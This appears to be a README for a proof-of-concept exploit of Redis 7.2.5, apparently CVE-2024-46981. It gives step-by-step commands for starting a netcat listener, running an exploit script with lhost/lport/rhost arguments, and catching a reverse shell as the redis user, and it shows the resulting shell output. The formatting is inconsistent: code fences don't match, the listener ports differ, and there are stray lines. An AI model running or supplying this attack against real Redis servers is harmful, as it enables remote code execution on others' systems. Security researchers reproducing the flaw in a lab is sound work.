To run the exploit please extract the attached ZIP and follow these steps on Linux:

1. Set up a virtualenv/install the Redis client 

```
pip install -r requirements.txt
```

2. In another terminal, run the Redis docker image
	- Or build from source and run on a support platform
		- The exploit has been tested and works on Fedora 40/Ubuntu 24.04
```

```
zone ip
```
$ docker run --network host redis:7.2.5 --bind 0.0.0.0 
$ redis-cli -h x.x.x.x -p 6379
x。x.x.x:6379> exit
```
check connection
```
```

3. Get the ip address of your host on the docker network

```
$ ifconfig
 
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.254.162  netmask 255.255.255.0  broadcast 192.168.254.255
        inet6 fe80::9f48:4a6f:10c2:b838  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:9b:0b:b0  txqueuelen 1000  (Ethernet)
        RX packets 1449284  bytes 1109758166 (1.0 GiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1277227  bytes 222037834 (211.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


```

4. In another terminal, run an netcat listener:

```
$ nc -nlvp 12345
```

5. Run the exploit:
	-  Replace `lhost` with your docker ip address

```
$ python3 exploit.py --lhost x.x.x.x --lport 12345 --rhost localhost 
```
python .\redis-2024-46981.py --lhost 192.168.254.194 --lport 12345 --rhost 192.168.254.162
```
6. You should receive a connection

```
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:2222
Ncat: Listening on 0.0.0.0:2222
Ncat: Connection from 172.17.0.2:36518.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
redis@4d1537f2dd4e:/data$

```
